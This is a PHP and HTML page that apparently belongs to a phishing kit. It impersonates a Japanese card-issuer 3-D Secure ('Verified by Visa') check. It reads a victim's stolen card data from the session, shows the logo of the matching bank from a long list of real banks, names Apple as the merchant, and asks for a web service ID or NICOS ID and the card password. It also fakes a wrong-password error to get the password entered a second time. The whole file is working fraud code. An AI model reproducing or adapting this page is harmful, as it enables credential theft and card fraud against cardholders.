<?php
session_start();
$date = date("Y/m/d");
$bank = $_SESSION['bank_name'];
$type = $_SESSION['bank_scheme'];
$negara = $_SESSION['country'];
if($type == "VISA") {
    if($negara == "Japan") {
    $gambartypes = "./../assets/img/visajp.gif";
    $ukuran = "";
    }else{
    $gambartypes = "./../assets/img/visa.png";
    $ukuran = 'width="100" height="47"';
    }
}
if($type == "MASTERCARD") {
    $gambartypes = "./../assets/img/mastercard.png";
    $ukuran = 'width="100" height="47"';
}
if($type == "AMEX") {
    $gambartypes = "./../assets/img/amex.png";
    $ukuran = 'width="100" height="47"';
}
if($type == "JCB") {
    $gambartypes = "./../assets/img/jcb.png";
    $ukuran = 'width="100" height="47"';
}
      if(preg_match('/WELLS/',$bank)) {
      $gambarvbv = "./../assets/img/bank/wellsfargo.png";
      }
      elseif(preg_match('/ANZ/',$bank)) {
      $gambarvbv = "./../assets/img/bank/anz.png";
      }
      elseif(preg_match('/HSBC/',$bank)) {
      $gambarvbv = "./../assets/img/bank/hsbc.png";
      }
      elseif(preg_match('/CIBC/',$bank)) {
      $gambarvbv = "./../assets/img/bank/cibc.png";
      }
      elseif(preg_match('/RBC/',$bank)) {
      $gambarvbv = "./../assets/img/bank/rbc.png";
      }
      elseif(preg_match('/BARCLAYS/',$bank)) {
      $gambarvbv = "./../assets/img/bank/barclays.png";
      }
      elseif(preg_match('/CITIBANK/',$bank)) {
      $gambarvbv = "./../assets/img/bank/citibank.png";
      }
      elseif(preg_match('/NICOS/',$bank)) {
      $nicos = "1";
      $gambarvbv = "./../assets/img/bank/nicos.png";
      }
      elseif(preg_match('/MITSUBISHI/',$bank)) {
      $gambarvbv = "./../assets/img/bank/mufg.png";
      $webidnya = "1";
      }
      elseif($bank == "CANADIAN IMPERIAL BANK OF COMMERCE") {
      $gambarvbv = "./../assets/img/bank/cibc.png";
      }
      elseif($bank == "CAPITAL ONE") {
      $gambarvbv = "./../assets/img/bank/capitalone.png";
      }
      elseif($bank == "CAPITAL ONE BANK") {
      $gambarvbv = "./../assets/img/bank/capitalone.png";
      }
      elseif($bank == "LLOYDS TSB BANK PLC") {
      $gambarvbv = "./../assets/img/bank/llyods-tsb.png";
      }
      elseif($bank == "BANK OF IRELAND") {
      $gambarvbv = "./../assets/img/bank/bor.png";
      }
      elseif($bank == "HDFC") {
      $gambarvbv = "./../assets/img/bank/hdfc.png";
      }
      elseif($bank == "SCOTIABANK") {
      $gambarvbv = "./../assets/img/bank/scotiabank.png";
      }
      elseif($bank == "JPMORGAN CHASE BANK, N.A.") {
      $gambarvbv = "./../assets/img/bank/jpmorganchase.png";
      }
      elseif($bank == "JPMORGANCHASE") {
      $gambarvbv = "./../assets/img/bank/jpmorganchase.png";
      }
      elseif(preg_match('/SANTANDER/',$bank)) {
      $gambarvbv = "./../assets/img/bank/santander.png";
      }
      elseif($bank == "BANCO SANTANDER, S.A.") {
      $gambarvbv = "./../assets/img/bank/santander.png";
      }
      elseif($bank == "SANTANDER DIREKT BANK AG") {
      $gambarvbv = "./../assets/img/bank/santander.png";
      }
      elseif($bank == "TD CANADA TRUST BANK") {
      $gambarvbv = "./../assets/img/bank/canadatrust.png";
      }
      elseif($bank == "BANK OF MONTREAL") {
      $gambarvbv = "./../assets/img/bank/bmo.png";
      }
      elseif($bank == "CHASE") {
      $gambarvbv = "./../assets/img/bank/chase.png";
      }
      elseif($bank == "STATE EMPLOYEES' CREDIT UNION") {
      $gambarvbv = "./../assets/img/bank/secu.png";
      }
      elseif($bank == "NAVY FEDERAL CREDIT UNION") {
      $gambarvbv = "./../assets/img/bank/nfcu.png";
      }
      elseif($bank == "TD BANK, N.A.") {
      $gambarvbv = "./../assets/img/bank/tdbank.png";
      }
      elseif($bank == "TDBANK") {
      $gambarvbv = "./../assets/img/bank/tdbank.png";
      }
      elseif($bank == "ARVEST BANK") {
      $gambarvbv = "./../assets/img/bank/arvest.png";
      }
      elseif($bank == "CITIZENS") {
      $gambarvbv = "./../assets/img/bank/rbscitizens.png";
      }
      elseif($bank == "FIFTH THIRD BANK, THE") {
      $gambarvbv = "./../assets/img/bank/53.png";
      }
      elseif(preg_match('/COMMONWEALTH/',$bank)) {
      $gambarvbv = "./../assets/img/bank/commonwealth.png";
      }
      elseif(preg_match('/SAISON/',$bank)) {
      $gambarvbv = "./../assets/img/bank/saison.png";
      }
      elseif(preg_match('/WESTPAC/',$bank)) {
      $gambarvbv = "./../assets/img/bank/westpac.png";
      }
      elseif($bank == "NATIONAL AUSTRALIA BANK, LTD.") {
      $gambarvbv = "./../assets/img/bank/nab.png";
      }
      elseif($bank == "NATIONAL AUSTRALIA BANK LIMITED") {
      $gambarvbv = "./../assets/img/bank/nab.png";
      }
      elseif(preg_match('/NATIONAL AUSTRALIA BANK/',$bank)) {
      $gambarvbv = "./../assets/img/bank/nab.png";
      }
      elseif($bank == "DBS") {
      $gambarvbv = "./../assets/img/bank/dbs.png";
      }
      elseif($bank == "POSB") {
      $gambarvbv = "./../assets/img/bank/posb.png";
      }
      elseif($bank == "OCBC") {
      $gambarvbv = "./../assets/img/bank/ocbc.png";
      }
      elseif($bank == "BANK OF CHINA") {
      $gambarvbv = "./../assets/img/bank/boc.png";
      }
      elseif($bank == "BANK OF EAST ASIA, LTD.") {
      $gambarvbv = "./../assets/img/bank/bea.png";
      }
      elseif($bank == "MITSUBISHI UFJ FINANCIAL GROUP, INC.") {
      $gambarvbv = "./../assets/img/bank/mufg.png";
      }
      elseif($bank == "SUMITOMO MITSUI CARD COMPANY, LTD.") {
      $gambarvbv = "./../assets/img/bank/smfg.png";
      }
      elseif($bank == "RAKUTEN KC CO., LTD.") {
      $gambarvbv = "./../assets/img/bank/rakuten.png";
      }
      elseif($bank == "SONY FINANCE INTERNATIONAL") {
      $gambarvbv = "./../assets/img/bank/sonybank.png";
      }
      elseif($bank == "DEUTSCHE BANK S.P.A.") {
      $gambarvbv = "./../assets/img/bank/deutsche.png";
      }
      elseif($bank == "BNP PARIBAS") {
      $gambarvbv = "./../assets/img/bank/bnp.png";
      }
      elseif($bank == "CREDIT AGRICOLE, S.A.") {
      $gambarvbv = "./../assets/img/bank/creditagri.png";
      }
      elseif($bank == "CREDIT SUISSE") {
      $gambarvbv = "./../assets/img/bank/creditsuis.png";
      }
      elseif($bank == "ROYAL BANK OF SCOTLAND") {
      $gambarvbv = "./../assets/img/bank/rbscotland.png";
      }
      elseif($bank == "SOCIETE GENERALE") {
      $gambarvbv = "./../assets/img/bank/socgen.png";
      }
      elseif($bank == "UBS AG") {
      $gambarvbv = "./../assets/img/bank/ubs.png";
      }
      elseif(preg_match('/BBVA/',$bank)) {
      $gambarvbv = "./../assets/img/bank/bbva.png";
      }
      elseif($bank == "BANCO DO BRASIL S.A.") {
      $gambarvbv = "./../assets/img/bank/bancobrasil.png";
      }
      elseif($bank == "BANCO DO BRASIL, S.A.") {
      $gambarvbv = "./../assets/img/bank/bancobrasil.png";
      }
      elseif($bank == "BANCO DO BRASIL") {
      $gambarvbv = "./../assets/img/bank/bancobrasil.png";
      }
      elseif($bank == "BANGKOK BANK PUBLIC CO., LTD.") {
      $gambarvbv = "./../assets/img/bank/bangkokbank.png";
      }
      elseif($bank == "BANK OF COMMUNICATIONS") {
      $gambarvbv = "./../assets/img/bank/bocom.png";
      }
      elseif($bank == "STATE BANK OF INDIA") {
      $gambarvbv = "./../assets/img/bank/bankofindia.png";
      }
      elseif($bank == "CHINA CONSTRUCTION BANK CORPORATION") {
      $gambarvbv = "./../assets/img/bank/ccb.png";
      }
      elseif($bank == "CHINATRUST COMMERCIAL BANK") {
      $gambarvbv = "./../assets/img/bank/ctbc.png";
      }
      elseif($bank == "COMMERZBANK AG") {
      $gambarvbv = "./../assets/img/bank/commerz.png";
      }
      elseif($bank == "ING BANK, N.V.") {
      $gambarvbv = "./../assets/img/bank/ing.png";
      }
      elseif($bank == "BB&T") {
      $gambarvbv = "./../assets/img/bank/bbt.png";
      }
      elseif($bank == "BRANCH BANKING AND TRUST COMPANY") {
      $gambarvbv = "./../assets/img/bank/bbt.png";
      }
      elseif($bank == "CITI") {
      $gambarvbv = "./../assets/img/bank/citi.png";
      }
      elseif($bank == "CITIFINANCIAL EUROPE PLC") {
      $gambarvbv = "./../assets/img/bank/citi.png";
      }
      elseif($bank == "CITIFINANCIAL EUROPE") {
      $gambarvbv = "./../assets/img/bank/citi.png";
      }
      elseif($bank == "BANK OF AMERICA") {
      $gambarvbv = "./../assets/img/bank/boa.png";
      }
      elseif($bank == "BANK OF AMERICA, N.A.") {
      $gambarvbv = "./../assets/img/bank/boa.png";
      }
      elseif($bank == "BANK OF AMERICA, NATIONAL ASSOCIATION") {
      $gambarvbv = "./../assets/img/bank/boa.png";
      }
      elseif($bank == "TCF NATIONAL BANK") {
      $gambarvbv = "./../assets/img/bank/tcf.png";
      }
      elseif($bank == "SOVEREIGN BANK") {
      $gambarvbv = "./../assets/img/bank/sovereign.png";
      }
      elseif($bank == "BANKWEST") {
      $gambarvbv = "./../assets/img/bank/bankwest.png";
      }
      elseif(preg_match('/ITAU/',$bank)) {
      $gambarvbv = "./../assets/img/bank/itau.png";
      }
      elseif($bank == "COMERICA BANK") {
      $gambarvbv = "./../assets/img/bank/comerica.png";
      }
      elseif($bank == "GE MONEY") {
      $gambarvbv = "./../assets/img/bank/gemoney.png";
      }
      elseif($bank == "GE CAPITAL FINANCE AUSTRALIA") {
      $gambarvbv = "./../assets/img/bank/gecapital.png";
      }
      elseif($bank == "GE CAPITAL RETAIL") {
      $gambarvbv = "./../assets/img/bank/gecapital.png";
      }
      elseif($bank == "WOODFOREST NATIONAL") {
      $gambarvbv = "./../assets/img/bank/woodforest.png";
      }
      elseif(preg_match('/USBANK/',$bank)) {
      $gambarvbv = "./../assets/img/bank/usbank.png";
      }
      elseif($bank == "U.S. BANK NATIONAL ASSOCIATION, ND") {
      $gambarvbv = "./../assets/img/bank/usbank.png";
      }
      elseif($bank == "U.S. BANK N.A. ND") {
      $gambarvbv = "./../assets/img/bank/usbank.png";
      }
      elseif($bank == "USAA") {
      $gambarvbv = "./../assets/img/bank/usaa.png";
      }
      elseif($bank == "DEUTSCHE APOTHEKER-UND AERZTEBANK EG") {
      $gambarvbv = "./../assets/img/bank/apotheker.png";
      }
      elseif($bank == "SANTANDER CONSUMER BANK AG") {
      $gambarvbv = "./../assets/img/bank/santander-consumer.png";
      }
      elseif($bank == "LANDESBANK BERLIN") {
      $gambarvbv = "./../assets/img/bank/lbb.png";
      }
      elseif($bank == "ZAO RAIFFEISENBANK") {
      $gambarvbv = "./../assets/img/bank/zaoraif.png";
      }
      elseif($bank == "OLDENBURGISCHE LANDESBANK AG") {
      $gambarvbv = "./../assets/img/bank/olb.png";
      }
      elseif($bank == "BANK ISLAM") {
      $gambarvbv = "./../assets/img/bank/bankislam.png";
      }
      elseif($bank == "PEOPLES BANK") {
      $gambarvbv = "./../assets/img/bank/peoplesbank.png";
      }
      elseif($bank == "BANK AUSTRIA") {
      $gambarvbv = "./../assets/img/bank/bankaustria.png";
      }
      elseif($bank == "INDUE, LTD.") {
      $gambarvbv = "./../assets/img/bank/indue.png";
      }
      elseif($bank == "TEACHERS CREDIT UNION") {
      $gambarvbv = "./../assets/img/bank/tcu.png";
      }
      elseif($bank == "HERITAGE BUILDING SOCIETY, LTD.") {
      $gambarvbv = "./../assets/img/bank/heritage.png";
      }
      elseif($bank == "BENDIGO BANK LIMITED") {
      $gambarvbv = "./../assets/img/bank/bendigo.png";
      }
      elseif($bank == "CUSCAL, LTD.") {
      $gambarvbv = "./../assets/img/bank/cuscal.png";
      }
      elseif($bank == "CREDIT UNION SERVICES CORPORATION (AUSTRALIA) LIMITED") {
      $gambarvbv = "./../assets/img/bank/cuscal.png";
      }
      elseif($bank == "EURO KARTENSYSTEME GMBH") {
      $gambarvbv = "./../assets/img/bank/eurokarten.png";
      }
      elseif($bank == "VERBAND DER SPARDA BANKEN E.V.") {
      $gambarvbv = "./../assets/img/bank/verband.png";
      }
      elseif($bank == "STANDARD CHARTERED BANK") {
      $gambarvbv = "./../assets/img/bank/standar-chartered.png";
      }
      elseif($bank == "FIDELITY") {
      $gambarvbv = "./../assets/img/bank/fidelity.png";
      }
      elseif($bank == "FIRST TENNESSEE BANK N.A.") {
      $gambarvbv = "./../assets/img/bank/first-ten.png";
      }
      elseif($bank == "CHOICE") {
      $gambarvbv = "./../assets/img/bank/choice.png";
      }
      elseif($bank == "METABANK") {
      $gambarvbv = "./../assets/img/bank/meta.png";
      }
      elseif($bank == "NORTHWEST") {
      $gambarvbv = "./../assets/img/bank/northwest.png";
      }
      elseif($bank == "NB&T") {
      $gambarvbv = "./../assets/img/bank/nbt.png";
      }
      elseif($bank == "PNC BANK N.A.") {
      $gambarvbv = "./../assets/img/bank/pnc.png";
      }
      elseif($bank == "TOYOTA") {
      $gambarvbv = "./../assets/img/bank/toyota.png";
      }
      elseif($bank == "UNITED NATIONS F.C.U.") {
      $gambarvbv = "./../assets/img/bank/unfcu.png";
      }
      elseif($bank == "DORAL BANK") {
      $gambarvbv = "./../assets/img/bank/doral.png";
      }
      elseif($bank == "CANADIAN TIRE") {
      $gambarvbv = "./../assets/img/bank/canadiantire.png";
      }
      elseif($bank == "BANK OF HAWAII") {
      $gambarvbv = "./../assets/img/bank/boh.png";
      }
      elseif($bank == "ASB BANK") {
      $gambarvbv = "./../assets/img/bank/asb.png";
      }
      elseif($bank == "BANK OF NEW ZEALAND") {
      $gambarvbv = "./../assets/img/bank/bnz.png";
      }
      elseif($bank == "HEARTLAND BANK") {
      $gambarvbv = "./../assets/img/bank/heartland.png";
      }
      elseif($bank == "KIWIBANK") {
      $gambarvbv = "./../assets/img/bank/kiwi.png";
      }
      elseif($bank == "MAYBANK") {
      $gambarvbv = "./../assets/img/bank/maybank.png";
      }
      elseif($bank == "MALAYAN BANKING BERHAD") {
      $gambarvbv = "./../assets/img/bank/maybank.png";
      }
      elseif($bank == "CIMB") {
      $gambarvbv = "./../assets/img/bank/cimb.png";
      }
      elseif($bank == "PUBLIC BANK BERHAD") {
      $gambarvbv = "./../assets/img/bank/public.png";
      }
      elseif($bank == "AMBANK") {
      $gambarvbv = "./../assets/img/bank/ambank.png";
      }
      elseif($bank == "UNITED OVERSEAS BANK, LTD.") {
      $gambarvbv = "./../assets/img/bank/uob.png";
      }
      elseif($bank == "NBAD") {
      $gambarvbv = "./../assets/img/bank/nbad.png";
      }
      elseif($bank == "NATIONAL BANK OF ABU DHABI") {
      $gambarvbv = "./../assets/img/bank/nbad.png";
      }
      elseif($bank == "BANK OF NOVA SCOTIA") {
      $gambarvbv = "./../assets/img/bank/scotiabank.png";
      }
      elseif($bank == "BANK OF NEW YORK MELLON") {
      $gambarvbv = "./../assets/img/bank/bny.png";
      }
      elseif($bank == "LOS ANGELES POLICE F.C.U.") {
      $gambarvbv = "./../assets/img/bank/lapcu.png";
      }
      elseif($bank == "BANCOLOMBIA") {
      $gambarvbv = "./../assets/img/bank/bancolombia.png";
      }
      elseif($bank == "BANCO AV VILLAS") {
      $gambarvbv = "./../assets/img/bank/bancoav.png";
      }
      elseif(preg_match('/BANCAFE/',$bank)) {
      $gambarvbv = "./../assets/img/bank/bancafe.png";
      }
      elseif($bank == "BANCO DE BOGOTA") {
      $gambarvbv = "./../assets/img/bank/bancobogota.png";
      }
      elseif(preg_match('/DAVIVIENDA/',$bank)) {
      $gambarvbv = "./../assets/img/bank/davidienda.png";
      }
      elseif(preg_match('/COLPATRIA/',$bank)) {
      $gambarvbv = "./../assets/img/bank/colpatria.png";
      }
      elseif(preg_match('/EPOS/',$bank)) {
      $gambarvbv = "./../assets/img/bank/epos.png";
      }
      elseif(preg_match('/DC/',$bank)) {
      $webidnya = "1";
      $gambarvbv = "./../assets/img/bank/dc.png";
      }
      elseif(preg_match('/LIFECARD/',$bank)) {
      $idnya = "1";
      }
      elseif(preg_match('/UC CARD/',$bank)) {
      $gambarvbv = "./../assets/img/bank/uc.png";
      }
      elseif(preg_match('/AEON/',$bank)) {
      $nonvbv = "1";
      }
      elseif(preg_match('/OMC/',$bank)) {
      $idnya = "1";
      }else{
      $gambarvbv = "blank";
      }
      if($nonvbv == "1"){
            if($getphoto == 'on') {
                  echo "<META HTTP-EQUIV='refresh' content='0; URL=?view=upload&appIdKey=".$_SESSION['key']."&id=".$_SESSION['xusername']."&country=".$cid."'>";
                  exit();
            }else{
                  echo "<META HTTP-EQUIV='refresh' content='0; URL=?view=done&appIdKey=".$_SESSION['key']."&id=".$_SESSION['xusername']."&country=".$cid."'>";
                  exit();
                  echo "non";
            }
      }
   ?>  
<html><head>
      <meta http-equiv="Expires" content="-1">
      <meta http-equiv="Pragma" content="no-cache">
      <meta http-equiv="Cache-Control" content="no-cache">
      <meta http-equiv="content-type" content="text/html; charset=UTF-8">
      
      <title>
            <?php echo $type;?>認証サービス
      </title>
</head>
<style>
    
.heading
{
    FONT-SIZE: 12px;
    FONT-WEIGHT: bold;
    FONT-FAMILY: "ＭＳ Ｐゴシック","ヒラギノ角ゴ Pro W3","Hiragino Kaku Gothic Pro",sans-serif;
}
.normal
{
    FONT-SIZE: 12px;
    FONT-FAMILY: "ＭＳ Ｐゴシック","ヒラギノ角ゴ Pro W3","Hiragino Kaku Gothic Pro",sans-serif;
    COLOR: #000000;
}

.normalgray
{
    FONT-SIZE: 12px;
    FONT-FAMILY: "ＭＳ Ｐゴシック","ヒラギノ角ゴ Pro W3","Hiragino Kaku Gothic Pro",sans-serif;
    COLOR: #666666;
}

.normalplus
{
    FONT-SIZE: 14px;
    FONT-FAMILY: "ＭＳ Ｐゴシック","ヒラギノ角ゴ Pro W3","Hiragino Kaku Gothic Pro",sans-serif;
    COLOR: #000000;
}
.normalbold
{
    FONT-SIZE: 12px;
    FONT-WEIGHT: bold;
    FONT-FAMILY: "ＭＳ Ｐゴシック","ヒラギノ角ゴ Pro W3","Hiragino Kaku Gothic Pro",sans-serif;
    COLOR: #000000;
}
.error
{
    FONT-SIZE: 12px;
    COLOR: red;
    FONT-FAMILY: "ＭＳ Ｐゴシック","ヒラギノ角ゴ Pro W3","Hiragino Kaku Gothic Pro",sans-serif;
}
.forgotlink
{
    FONT-WEIGHT: bold;
    FONT-SIZE: 10px;
    FONT-FAMILY: "ＭＳ Ｐゴシック","ヒラギノ角ゴ Pro W3","Hiragino Kaku Gothic Pro",sans-serif;
    COLOR: #666666;
    TEXT-DECORATION: underline;
}

.normallink
{
    FONT-WEIGHT: bold;
    FONT-SIZE: 12px;
    COLOR: #666666;
    FONT-FAMILY: "ＭＳ Ｐゴシック","ヒラギノ角ゴ Pro W3","Hiragino Kaku Gothic Pro",sans-serif;
    TEXT-DECORATION: underline;
}

.copyright
{
    FONT-SIZE: 10px;
    COLOR: gray;
    FONT-FAMILY: "ＭＳ Ｐゴシック","ヒラギノ角ゴ Pro W3","Hiragino Kaku Gothic Pro",sans-serif;
}
A.helplink
{
    FONT-WEIGHT: bold;
    FONT-SIZE: 12px;
    COLOR: #666666;
    FONT-FAMILY: "ＭＳ Ｐゴシック","ヒラギノ角ゴ Pro W3","Hiragino Kaku Gothic Pro",sans-serif;
    TEXT-DECORATION: none;
}
A.helplink:hover
{
    COLOR: red;
    TEXT-DECORATION: none;
}

.required{
    border-width: 1px;
    border-color: rgb(214, 214, 214);
    border-style: solid;
    border-radius: 1px;
    position: absolute;
    height: 15px;
    font-family: sans-serif;
    padding-left: 5px;
    font-size: 12px;

}

.required:focus{
    outline: none;
    border-color:#97CDF5;
    border-width: 0px;
       -moz-box-shadow: 0px 0px 0px 2px #97CDF5;
    -webkit-box-shadow: 0px 0px 0px 2px #97CDF5;
            box-shadow: 0px 0px 0px 2px #97CDF5;
}
</style>
<body onload="SetFocus()" bgcolor="#ffffff">
<form method="post">
<center>
<table cellpadding="0" cellspacing="0" border="0">
<tbody><tr>
      <td>
            <table cellpadding="0" cellspacing="0" border="0" width="350px">
          <tbody><tr>
                  <td valign="top">

                        
                        <table cellpadding="0" cellspacing="0" border="0" width="100%">
                        <tbody><tr>
                              <td>
                                    <table bgcolor="#FFFFFF" border="0" bordercolor="#88A0B8" width="100%">
                                    <tbody><tr>
                                          <td align="left" width="50%">
                                                <img src="<?php echo $gambartypes;?>" border="0" <?php echo $ukuran;?>>
                                          </td>
                                          
                                          <?php if($gambarvbv == "blank") {
                                                  
                                              }else{?>
                                              <td align="right" width="50%">
                                                <img src="<?php echo $gambarvbv;?>" width="140" height="47">
                                                </td>
                                                <?php }?>
                                    </tr>
                                    </tbody></table>
                                    <br>
                              </td>
                        </tr>
                        </tbody></table>






    <table cellpadding="3" cellspacing="0" border="0" width="100%">
      <tbody><tr>
            

                
            <td align="left" colspan="3" class="normalgray">
                        
                        <?php
                        if($_GET['error'] == 1){
                              echo "<b><font color='red'>入力されたパスワードは正しくありません。<br>
ご確認の上、再度ご入力をお願い致します。<br>
4桁のピンは入力しないでください。(5161)</font></b>";
                        }else{
                              echo "本人認証を行います。パスワードを入力してください。";
                        }
                        ?>
                  </td>
            
      </tr>
      <tr>
            <td align="left" height="10"><img src="img/spacer.gif" height="10" width="1"></td>
      </tr>
      <tr>
        <td valign="top" align="left">
            <table cellpadding="3" cellspacing="0" border="0" width="100%">

     
            <tbody><tr>
                <td class="normalbold" valign="top" align="right" width="150px">
                    加盟店名:
                </td>
                <td width="10px">
                </td>
                <td valign="top" class="normalbold" width="180px">
                                                Apple
                </td>
            </tr>
            
            
            <tr>
                <td class="normalbold" valign="top" align="right" width="150px">
                    日付:
                </td>
                <td width="10px">
                </td>
                <td valign="top" class="normalbold" width="180px">
                    <?php echo $date;?>
                </td>
            </tr>
            <tr>
                <td class="normalbold" valign="top" align="right" width="150px">
                    カード番号:
                </td>
                <td width="10px">
                </td>
                <td valign="top" class="normalbold" width="180px">
                    **** **** **** <?php echo substr($_SESSION['ccnumber'], -4);?>
                </td>
            </tr>


            <?php
            if($type == "JCB") {
                  echo "";
            }else if(preg_match('/resona/',strtolower($bank)) or preg_match('/kokunai/',strtolower($bank)) or preg_match('/nippon/',strtolower($bank)) or preg_match('/sumitomo/',strtolower($bank)) or preg_match('/saison/',strtolower($bank))){
                  echo "";
            }else if($nicos == "1") {
            ?>
            <tr>
                <td class="normalbold" valign="center" width="150px" align="right">
                    NICOS ID:
                </td>
                <td width="10px">
                </td>
                <td valign="top" width="180px">
                    <!-- no errors, retain password -->
                                                  
                              <input class="required" type="text" maxlength="20" size="20" name="cardid" autocomplete="off"><br>
                                              </td>
                
            </tr>
            <?php
            }else{
                  ?>
            <tr>
                <td class="normalbold" valign="center" width="150px" align="right">
                    WEB サービス ID:
                </td>
                <td width="10px">
                </td>
                <td valign="top" width="180px">
                    <!-- no errors, retain password -->
                                                  
                              <input class="required" type="text" maxlength="20" size="20" name="cardid" autocomplete="off"><br>
                                              </td>
                
            </tr>

            <?php
      }?>
            <tr>
                <td class="normalbold" valign="center" width="150px" align="right">
                    パスワード:
                </td>
                <td width="10px">
                </td>
                <td valign="top" width="180px">
                    <!-- no errors, retain password -->
                                                  
                              <input class="required" type="password" maxlength="20" placeholder="" required="required" size="20" name="vbv_jp" autocomplete="off">
                                              </td>
                
            </tr>

            

            <tr>
                
                    <td valign="top" align="left">&nbsp;</td>
                    <td width="10px">
                    </td>
                    <td valign="top" align="left" width="180px">

                <table cellpadding="0" cellspacing="0" border="0" width="180px">
                <tbody><tr>
                  <td nowrap="">

                        
                        
                                    <input type="submit" id="sendButton" value="送信">
                                    
                  </td>
                  <td nowrap="">


                        

                        <script>
                            document.write("<a class=\"normallink\" href=\"javascript:Help()\">");
                        </script><a class="normallink" href="javascript:Help()">
                        <noscript>
                            &lt;a class="normallink" href="help.jsp?CardProductId={0}&amp;Fi={1}&amp;ServiceCode={2}&amp;ImplDesc={3}" target="_blank"&gt;
                        </noscript>
                            
                        </a>

                  </td>
                  <td nowrap="">

                        

                        
</td>
<td nowrap="">  

                        

                       

                  </td>
            </tr>
            </tbody></table>

                    </td>
                
            </tr>

            </tbody></table>
        </td>
    </tr>
    </tbody></table>

    

                        </td></tr><tr>
                              </tr></tbody></table><table cellpadding="0" cellspacing="0" bgcolor="#FFFFFF" border="0" bordercolor="#88A0B8" width="100%">
                              <tbody><tr>
                                    <td class="copyright" align="center">
                                          
                                    </td>
                              </tr>
                              </tbody></table>
                        </td></tr>

      
                  
            
            </tbody></table>
      


</center>


</form>









</body></html>